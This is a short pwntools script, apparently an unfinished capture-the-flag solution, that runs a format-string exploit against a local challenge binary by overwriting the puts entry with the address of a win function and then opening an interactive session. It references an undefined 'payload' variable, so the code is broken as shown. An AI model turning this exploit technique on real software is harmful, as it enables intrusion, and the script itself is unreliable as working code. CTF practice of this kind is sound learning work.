from pwn import *
binary = context.binary = ELF('./chall_11')
p = process(binary.path)
offset = 10
p.sendline(fmtstr_payload(offset,{binary.sym.puts:binary.sym.win}))
null = payload.find(b'\x00')
p.recvuntil(payload[null-3:null])
p.interactive()

# NOT FINISHED
#Sending $p until you get the the same value as the input. This will give you the offset. After the offset you need to swape puts with win. 
